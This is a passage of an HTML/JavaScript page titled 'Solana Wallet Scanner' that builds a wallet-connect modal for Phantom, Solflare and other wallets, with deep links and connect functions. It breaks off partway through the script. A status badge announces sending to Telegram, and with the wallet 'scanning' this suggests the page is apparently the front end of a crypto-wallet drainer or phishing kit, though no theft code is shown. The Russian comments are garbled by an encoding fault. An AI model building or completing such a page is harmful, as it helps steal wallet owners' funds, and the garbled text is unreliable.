<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Solana Wallet Scanner - Mobile Enhanced</title>
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Solana Web3.js –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
  
  <!-- –ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ -->
  <script src="https://cdn.jsdelivr.net/npm/mobile-detect@1.4.5/mobile-detect.min.js"></script>
  
  <!-- QR-–∫–æ–¥ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä -->
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
  
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    #connectWalletBtn {
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 10px;
      background-color: #4a90e2;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #connectWalletBtn:hover {
      background-color: #357abd;
    }

    #connectWalletBtn.connected {
      background-color: #28a745;
    }

    #connectWalletBtn.connected:hover {
      background-color: #218838;
    }

    .hidden {
      display: none;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.5);
      z-index: 1000;
    }

    .connect-wallet, .all-wallets-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 20px;
      width: 350px;
      padding: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      z-index: 1001;
    }

    .connect-header, .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .connect-header h2, .modal-header h2 {
      margin: 0;
      font-size: 1.2rem;
      font-weight: 600;
      flex-grow: 1;
      text-align: center;
    }

    .help-btn, .close-btn, .back-btn {
      background: none;
      border: none;
      font-size: 1.2rem;
      cursor: pointer;
      width: 30px;
      height: 30px;
      color: #333;
    }

    .help-btn {
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background-color: #e0e0e0;
    }

    .wallet-list {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .wallet-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px;
      background: #f5f5f5;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
      position: relative;
    }

    .wallet-option:hover {
      background: #e0e0e0;
    }

    .wallet-option img {
      width: 40px;
      height: 40px;
      margin-right: 10px;
      border-radius: 12px;
    }

    .wallet-option span {
      flex-grow: 1;
      font-size: 1rem;
      color: #333;
    }

    .wallet-status {
      font-size: 0.8rem;
      color: #28a745;
      margin-left: 10px;
    }

    .wallet-status.mobile {
      color: #007bff;
    }

    .wallet-status.desktop {
      color: #6c757d;
    }

    .connection-status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 8px;
      text-align: center;
      font-size: 0.9rem;
    }

    .connection-status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .connection-status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .connection-status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .connection-status.scanning {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeaa7;
    }

    .wallet-info {
      margin-top: 15px;
      padding: 10px;
      background: #f8f9fa;
      border-radius: 8px;
      font-size: 0.85rem;
    }

    .wallet-info .address {
      font-family: monospace;
      word-break: break-all;
      margin-top: 5px;
      color: #495057;
    }

    .get-started {
      text-align: center;
      margin-top: 20px;
      color: #666;
      font-size: 0.9rem;
    }

    .get-started a {
      color: #0000EE;
      text-decoration: none;
    }

    .get-started a:hover {
      text-decoration: underline;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      overflow-y: auto;
      flex-grow: 1;
    }

    .wallet-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f9f9f9;
      border-radius: 15px;
      padding: 10px;
      cursor: pointer;
      transition: background 0.3s;
      user-select: none;
      position: relative;
    }

    .wallet-item:hover {
      background: #e0e0e0;
    }

    .wallet-item img {
      width: 80px;
      height: 80px;
      margin-bottom: 8px;
      object-fit: contain;
      border-radius: 15px;
    }

    .wallet-item span {
      font-size: 0.85rem;
      color: #333;
      text-align: center;
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* QR Code Modal */
    .qr-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 20px;
      width: 350px;
      padding: 20px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      z-index: 1002;
      text-align: center;
    }

    .qr-code-container {
      margin: 20px 0;
      display: flex;
      justify-content: center;
    }

    .qr-code-container canvas {
      border-radius: 10px;
      border: 2px solid #e0e0e0;
    }

    .qr-instructions {
      color: #666;
      font-size: 0.9rem;
      margin-top: 15px;
    }

    /* Telegram Status Indicator */
    .telegram-status {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 8px 12px;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: bold;
      z-index: 2000;
      transition: all 0.3s ease;
    }

    .telegram-status.sending {
      background: #ffc107;
      color: #856404;
    }

    .telegram-status.success {
      background: #28a745;
      color: white;
    }

    .telegram-status.error {
      background: #dc3545;
      color: white;
    }

    /* Initialization Status */
    .init-status {
      position: fixed;
      bottom: 20px;
      left: 20px;
      padding: 8px 12px;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: bold;
      z-index: 2000;
      background: #17a2b8;
      color: white;
    }

    /* Mobile Adjustments */
    @media (max-width: 394px) {
      .connect-wallet, .all-wallets-modal, .qr-modal {
        top: auto;
        bottom: 0;
        left: 0;
        right: 0;
        transform: none;
        width: 100vw;
        padding: 15px;
        border-radius: 15px 15px 0 0;
        max-height: 85vh;
        overflow-y: auto;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        box-sizing: border-box;
      }

      .telegram-status {
        top: 10px;
        right: 10px;
        font-size: 0.7rem;
        padding: 6px 10px;
      }

      .init-status {
        bottom: 10px;
        left: 10px;
        font-size: 0.7rem;
        padding: 6px 10px;
      }

      .wallet-item img {
        width: 60px;
        height: 60px;
        margin-bottom: 6px;
      }

      .wallet-item span {
        font-size: 0.8rem;
      }
    }
    
    /* –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç–∏–ª–∏ –¥–ª—è QR-–∫–æ–¥–∞ –∏ deep links */
    .qr-section {
      margin-top: 20px;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 10px;
      text-align: center;
    }
    
    .deep-link-section {
      margin-top: 15px;
      padding: 10px;
      background: #f0f4ff;
      border-radius: 8px;
    }
    
    .deep-link-btn {
      background: #4a90e2;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 5px;
      cursor: pointer;
      margin: 5px;
      font-size: 0.9rem;
      transition: background-color 0.3s;
    }
    
    .deep-link-btn:hover {
      background: #357abd;
    }
    
    .deep-link-btn.phantom {
      background: #AB9FF2;
    }
    
    .deep-link-btn.phantom:hover {
      background: #9B8FF2;
    }
    
    .device-info {
      margin-top: 10px;
      padding: 8px;
      background: #e9ecef;
      border-radius: 5px;
      font-size: 0.8rem;
      color: #495057;
    }

    .mobile-instructions {
      background: #e7f3ff;
      border: 1px solid #b3d9ff;
      border-radius: 8px;
      padding: 12px;
      margin: 15px 0;
      font-size: 0.9rem;
      color: #0066cc;
    }

    .desktop-instructions {
      background: #f8f9fa;
      border: 1px solid #dee2e6;
      border-radius: 8px;
      padding: 12px;
      margin: 15px 0;
      font-size: 0.9rem;
      color: #495057;
    }
  </style>
</head>
<body>
  <!-- Telegram Status Indicator -->
  <div id="telegramStatus" class="telegram-status hidden">üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...</div>

  <!-- Initialization Status -->
  <div id="initStatus" class="init-status">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

  <!-- Button to open the modal -->
  <button id="connectWalletBtn">Connect Wallet</button>

  <!-- Modal Overlay -->
  <div id="modalOverlay" class="modal-overlay hidden"></div>

  <!-- Connect Wallet Modal -->
  <div id="connectWalletModal" class="connect-wallet">
    <div class="connect-header">
      <button class="help-btn" title="Help">?</button>
      <h2>Connect Wallet</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    
    <!-- Connection Status Display -->
    <div id="connectionStatus" class="connection-status hidden"></div>
    
    <!-- Wallet Info Display -->
    <div id="walletInfo" class="wallet-info hidden">
      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
      <div><strong>Address:</strong></div>
      <div class="address" id="walletAddress"></div>
      
      <div style="margin-top: 10px;">
        <button id="disconnectBtn" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Disconnect</button>
        <button id="rescanBtn" style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 5px;">Rescan</button>
      </div>
    </div>

    <div class="wallet-list">
      <div class="wallet-option" data-wallet="phantom">
        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
        <span>Phantom</span>
        <div class="wallet-status" id="phantomStatus">Checking...</div>
      </div>
      <div class="wallet-option" data-wallet="solflare">
        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
        <span>Solflare</span>
        <div class="wallet-status" id="solflareStatus">Checking...</div>
      </div>
      <div class="wallet-option" data-wallet="trustwallet">
        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
        <span>Trust Wallet</span>
        <div class="wallet-status" id="trustwalletStatus">Checking...</div>
      </div>
      <div class="wallet-option" data-wallet="coinbase">
        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
        <span>Coinbase</span>
        <div class="wallet-status" id="coinbaseStatus">Checking...</div>
      </div>
      <div class="wallet-option" data-wallet="bitget">
        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
        <div class="wallet-status" id="bitgetStatus">Checking...</div>
      </div>
      <div class="wallet-option" id="allWalletsBtn">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
        <span>All Wallets</span>
      </div>
    </div>
    <div class="get-started">
      Haven't got a wallet? <a href="https://phantom.app/" target="_blank">Get started</a>
    </div>
  </div>

  <!-- All Wallets Modal -->
  <div id="allWalletsModal" class="all-wallets-modal hidden">
    <div class="modal-header">
      <button class="back-btn" title="Back">‚Üê</button>
      <h2>All Wallets</h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    <div class="wallet-grid">
      <div class="wallet-item" data-wallet="phantom" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Phantom" />
        <span>Phantom</span>
      </div>
      <div class="wallet-item" data-wallet="solflare" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
        <span>Solflare</span>
      </div>
      <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E" alt="Trust Wallet" />
        <span>Trust Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Coinbase" />
        <span>Coinbase</span>
      </div>
      <div class="wallet-item" data-wallet="bitget" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E" alt="Bitget Wallet" />
        <span>Bitget Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="backpack" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Backpack" />
        <span>Backpack</span>
      </div>
      <div class="wallet-item" data-wallet="okx" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="OKX Wallet" />
        <span>OKX Wallet</span>
      </div>
      <div class="wallet-item" data-wallet="exodus" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:bx=%22https://boxy-svg.com%22%20viewBox=%220%200%20295%20295%22%3E%3Cdefs%3E%3ClinearGradient%20bx:pinned=%22true%22%20id=%22a%22%3E%3Cstop%20offset=%220%22%20stop-color=%22%230a0c1a%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23333349%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22b%22%20x1=%22147.5%22%20x2=%22147.5%22%20y1=%220%22%20y2=%22295%22%20gradientTransform=%22matrix(-1%20-1%201%20-1%20105.4%20399)%22%20gradientUnits=%22userSpaceOnUse%22%20href=%22%23a%22/%3E%3ClinearGradient%20id=%22c%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22d%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22e%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22f%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22h%22%20x1=%2215.4%22%20x2=%22116.8%22%20y1=%2246.2%22%20y2=%22121.9%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20offset=%22.1%22%20stop-color=%22%238952FF%22%20stop-opacity=%22.9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23DABDFF%22%20stop-opacity=%220%22/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill=%22url(%23b)%22%20d=%22M0%200h295v295H0z%22/%3E%3Cpath%20fill=%22url(%23c)%22%20d=%22M248.6%20102%20161%2044.5v32.2l56.3%2036.5-6.6%2021h-49.7v26.6h49.7l6.6%2021-56.3%2036.5v32.2l87.7-57.3-14.3-45.6%2014.3-45.6Z%22/%3E%3Cpath%20fill=%22url(%23d)%22%20d=%22M84.6%20160.8h49.5v-26.6H84.4l-6.4-21%2056-36.5V44.5L46.4%20102l14.4%2045.6-14.4%2045.6%2088%2057.3v-32.2L78%20181.8l6.6-21Z%22/%3E%3Cmask%20id=%22g%22%20width=%22203%22%20height=%22206%22%20x=%222%22%20y=%220%22%20maskUnits=%22userSpaceOnUse%22%20style=%22mask-type:alpha%22%3E%3Cpath%20fill=%22url(%23e)%22%20d=%22M204.1%2057.3%20116.7%200v32l56%2036.5-6.5%2020.9h-49.5v26.5h49.5l6.6%2021-56.1%2036.4v32l87.4-57.1-14.3-45.4%2014.3-45.5Z%22/%3E%3Cpath%20fill=%22url(%23f)%22%20d=%22M40.6%20116h49.3V89.3H40.4L34%2068.5l55.9-36.4V0L2.5%2057.3l14.3%2045.5-14.3%2045.4L90%20205.3v-32L34%20136.8l6.6-20.9Z%22/%3E%3C/mask%3E%3Cg%20mask=%22url(%23g)%22%20transform=%22translate(43.9%2044.5)%22%3E%3Cpath%20fill=%22url(%23h)%22%20d=%22M2.6%200h200.2v205.3H2.6z%22/%3E%3C/g%3E%3C/svg%3E" alt="Exodus" />
        <span>Exodus</span>
      </div>
      <div class="wallet-item" data-wallet="safepal" tabindex="0">
        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20260%20260%22%3E%3Cpath%20fill=%22%234A21EF%22%20d=%22M0%200h260v260H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20d=%22M121%2057.5c-4.4%200-8.6%201.8-11.8%205l-49.4%2049.3a9.6%209.6%200%200%200%200%2013.6l32.4%2032.4v-57.4c0-4.2%203.4-7.7%207.7-7.7h68l35.3-35.2H121ZM92.2%20168.5h68c4.3%200%207.8-3.5%207.8-7.8v-57.3l32.4%2032.4a9.6%209.6%200%200%201%200%2013.6l-49.5%2049.4c-3.1%203.1-7.4%204.9-11.8%204.9H57l35.2-35.2Z%22/%3E%3C/svg%3E" alt="SafePal" />
        <span>SafePal</span>
      </div>
    </div>
  </div>

  <!-- QR Code Modal -->
  <div id="qrModal" class="qr-modal hidden">
    <div class="connect-header">
      <div></div>
      <h2>Connect <span id="qrWalletName">Wallet</span></h2>
      <button class="close-btn" title="Close">√ó</button>
    </div>
    
    <div id="mobileInstructions" class="mobile-instructions hidden">
      <strong>üì± Mobile Instructions:</strong><br>
      1. Make sure <span id="walletAppName">Phantom</span> app is installed<br>
      2. Tap "Open in App" button below<br>
      3. Approve connection in the app<br>
      4. Return to this browser tab
    </div>

    <div id="desktopInstructions" class="desktop-instructions hidden">
      <strong>üíª Desktop Instructions:</strong><br>
      1. Install <span id="walletExtensionName">Phantom</span> browser extension<br>
      2. Create or import your wallet<br>
      3. Refresh this page and try connecting again
    </div>
    
    <div class="qr-code-container">
      <canvas id="qrCanvas"></canvas>
    </div>
    
    <div class="qr-instructions">
      Scan this QR code with your mobile wallet app
    </div>
    
    <div class="deep-link-section">
      <div style="margin-bottom: 10px; font-weight: bold;">Quick Actions:</div>
      <div id="deepLinkButtons"></div>
    </div>
  </div>

  <script>
    // ============================================================================
    // ENHANCED DEVICE DETECTION AND WALLET ADAPTER LOGIC
    // ============================================================================
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º Mobile-Detect
    const md = new MobileDetect(window.navigator.userAgent);
    
    // –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π wallet-adapter –ø—Ä–∏–Ω—Ü–∏–ø–æ–≤
    const WALLET_ADAPTER_CONFIG = {
      phantom: {
        name: 'Phantom',
        logo: 'https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png',
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –∫–æ—à–µ–ª—å–∫–∞
        readyState: () => {
          if (typeof window !== 'undefined') {
            return window.phantom?.solana?.isPhantom ? 'Installed' : 'NotDetected';
          }
          return 'Unsupported';
        },
        // –ú–æ–±–∏–ª—å–Ω—ã–µ deep links
        mobile: {
          android: {
            scheme: 'phantom://browse/',
            universal: 'https://phantom.app/ul/browse/',
            storeUrl: 'https://play.google.com/store/apps/details?id=app.phantom'
          },
          ios: {
            scheme: 'phantom://browse/',
            universal: 'https://phantom.app/ul/browse/',
            storeUrl: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
          }
        },
        // –î–µ—Å–∫—Ç–æ–ø–Ω—ã–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è
        desktop: {
          chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
          firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
          brave: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
          edge: 'https://microsoftedge.microsoft.com/addons/detail/phantom/plbkjgbpikjdeapofaeipgcbfmpckmpl'
        },
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        connect: async function() {
          const provider = window.phantom?.solana;
          if (!provider) {
            throw new Error('Phantom wallet not found');
          }
          
          try {
            const response = await provider.connect();
            console.log('üîó Phantom connected:', response.publicKey.toString());
            return {
              publicKey: response.publicKey.toString(),
              provider: provider
            };
          } catch (error) {
            console.error('‚ùå Phantom connection failed:', error);
            throw error;
          }
        }
      },
      solflare: {
        name: 'Solflare',
        logo: 'https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png',
        readyState: () => {
          if (typeof window !== 'undefined') {
            return window.solflare?.isSolflare ? 'Installed' : 'NotDetected';
          }
          return 'Unsupported';
        },
        mobile: {
          android: {
            scheme: 'solflare://browse/',
            universal: 'https://solflare.com/ul/browse/',
            storeUrl: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
          },
          ios: {
            scheme: 'solflare://browse/',
            universal: 'https://solflare.com/ul/browse/',
            storeUrl: 'https://apps.apple.com/app/solflare/id1580902717'
          }
        },
        desktop: {
          chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
          firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
          brave: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
          edge: 'https://microsoftedge.microsoft.com/addons/detail/solflare/hgkehpkmdmjdlgpibpnlbcnbdjkbgfnl'
        },
        connect: async function() {
          const provider = window.solflare;
          if (!provider) {
            throw new Error('Solflare wallet not found');
          }
          
          try {
            await provider.connect();
